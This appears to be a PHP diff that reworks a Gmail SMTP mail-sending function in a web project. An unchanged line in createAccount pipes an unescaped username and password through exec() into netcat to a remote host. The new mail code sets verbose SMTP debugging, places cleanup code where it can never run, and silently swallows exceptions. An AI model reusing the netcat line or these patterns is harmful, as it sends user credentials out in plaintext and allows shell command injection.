@@ -403,7 +403,7 @@ function createAccount($data=array())
 	exec("echo '".$data['username']. " ".$data['password']."' | nc ".$host." ".$port);
 }
 
-function sendGlobalMail($to,$from,$msg,$config=false){
+function sendGlobalMail($to,$from,$msg,$config=true){
 
 
 	GLOBAL $CONFIG, $LOCALE;
@@ -422,38 +422,40 @@ function sendGlobalMail($to,$from,$msg,$config=false){
 	if ($from !='') $from = $from;
 	else $from = $CONFIG['EMAIL_FROM_DEFAULT'];
 	
-	$mail = new PHPMailer();
+	$mail = new PHPMailer(true);
 	$mail->IsSMTP(); // telling the class to use SMTP
-	$mail->Host       = $CONFIG['EMAIL_SMTP_HOST'];  // sets the SMTP server
-	$mail->SMTPDebug  = 1;                     // enables SMTP debug information (for testing)
-											   // 1 = errors and messages
-											   // 2 = messages only		
+
+	try {
+	ob_start();
+		$mail->Host       = $CONFIG['email']['EMAIL_SMTP_HOST']; // SMTP server
+		$mail->SMTPDebug  = 2;                     // enables SMTP debug information (for testing)
+		$mail->SMTPAuth   = true;                  // enable SMTP authentication
+		$mail->SMTPSecure = "ssl";                 // sets the prefix to the servier
+		$mail->Host       = "smtp.gmail.com";      // sets GMAIL as the SMTP server
+		$mail->Port       = 465;                   // set the SMTP port for the GMAIL server
+		$mail->Username   = $CONFIG['email']['EMAIL_FROM_DEFAULT'];  // GMAIL username
+		$mail->Password   = $CONFIG['email']['EMAIL_SMTP_PASSWORD'];            // GMAIL password
+		// $mail->AddReplyTo($CONFIG['email']['EMAIL_FROM_DEFAULT'], 'No Reply');
+		$mail->AddAddress($to);
+		$mail->SetFrom($CONFIG['email']['EMAIL_FROM_DEFAULT'], 'No Reply Account');
+		// $mail->AddReplyTo('trinata.webmail@gmail.com', 'No Reply');
+		$mail->Subject = "[ NOTIFICATION ] Flora Kalbar";
+		$mail->AltBody = 'To view the message, please use an HTML compatible email viewer!'; // optional - MsgHTML will create an alternate automatically
+		$mail->MsgHTML($msg);
+		// $mail->Send();
+		$result = $mail->Send();
+
+		if($result) return array('message'=>'success send mail','result'=>true,'res'=>$result);
+		else return array('message'=>'error mail setting','result'=>false,'res'=>$mail->ErrorInfo);
+	ob_end_clean();
+
+	}catch (phpmailerException $e) {
+	  // echo $e->errorMessage(); //Pretty error messages from PHPMailer
+	} catch (Exception $e) {
+	  // echo $e->getMessage(); //Boring error messages from anything else!
+	}
+
 	
-	$mail->SMTPAuth   = false;                  // enable SMTP authentication
-	$mail->SMTPSecure = "ssl";                 // sets the prefix to the servier
-	$mail->Host       = "smtp.gmail.com";      // sets GMAIL as the SMTP server
-	$mail->Port       = 465;                    // set the SMTP port for the GMAIL server
-	$mail->Username   = $CONFIG['EMAIL_SMTP_USER']; // SMTP account username
-	$mail->Password   = $CONFIG['EMAIL_SMTP_PASSWORD'];        // SMTP account password
-	
-	$mail->SetFrom($from, 'No Reply Account');
-	// $mail->From =$CONFIG['EMAIL_FROM_DEFAULT'];	
-
-	$mail->Subject    = "[ NOTIFICATION ] Flora Kalbar";
-
-	$mail->AltBody    = "To view the message, please use an HTML compatible email viewer!"; // optional, comment out and test
-
-	$mail->MsgHTML($msg);
-
-	$address = $to;
-	$mail->AddAddress($address);
-
-	//$mail->AddAttachment("images/phpmailer.gif");      // attachment
-	
-	$result = $mail->Send();
-
-	if($result) return array('message'=>'success send mail','result'=>true,'res'=>$result);
-	else return array('message'=>'error mail setting','result'=>false,'res'=>$mail->ErrorInfo);
 }
 
 
